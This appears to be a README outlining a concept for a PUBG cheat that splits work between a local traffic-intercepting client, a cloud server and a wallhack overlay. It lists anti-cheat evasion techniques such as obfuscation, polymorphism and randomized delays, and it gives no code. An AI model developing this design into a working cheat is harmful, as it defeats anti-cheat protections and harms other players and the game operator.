# 👻 Ghost of the Fog

## ✨ Concept of a Resilient PUBG Cheat with Cloud Architecture ✨

---

## 📜 Description

"Ghost of the Fog" is a concept for an advanced PUBG cheat designed for maximum stealth and resilience against detection by leveraging a distributed cloud architecture. Instead of executing all logic on the user's local machine, the majority of data processing is offloaded to remote servers, minimizing local footprints and complicating analysis by Anti-Cheat systems.

**⚠️ IMPORTANT:** This concept is presented solely for **educational and research purposes**. Creating and using such software is **illegal** and violates game rules. I do not provide any real instructions, code, or executable files.

|---------------------|-----------|--------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------|
| 💻 Local Client     | **Ghost** | Traffic interception, communication with the cloud, minimal local footprint | 👻 Anti-Cheat Evasion (low-level interception, obfuscation, polymorphism, encryption), 📦 Small file size, 🔑 Covert control.                |
| ☁️ Cloud Server     | **Fog**   | Game data processing, world modeling, output data generation               | 📊 Network traffic analysis, 🗺️ World modeling, 🧠 Intelligent data processing, ⚖️ Scalability, 🛡️ Distributed architecture.               |
| 👁️ Display Mechanism | **Phantom** | Overlaying information (WallHack/MapHack) on top of the game screen        | 👻 Anti-Cheat Evasion (OS-level overlays), 🔄 Dynamic updates, ⏱️ Randomized delays, 🔑 Covert control.                                         |

## ✨ Advantages of Cloud Architecture
## 👻 Minimal Footprint: Reduced code and data on the local machine.
## 🕵️ Detection Difficulty: Activity on a remote server is harder to trace.
## ⚖️ Scalability: Easy increase in power to support more users.
## 🛡️ Resilience: High availability of cloud services.
## 🔄 Centralized Control: Simplifies updates and changes.
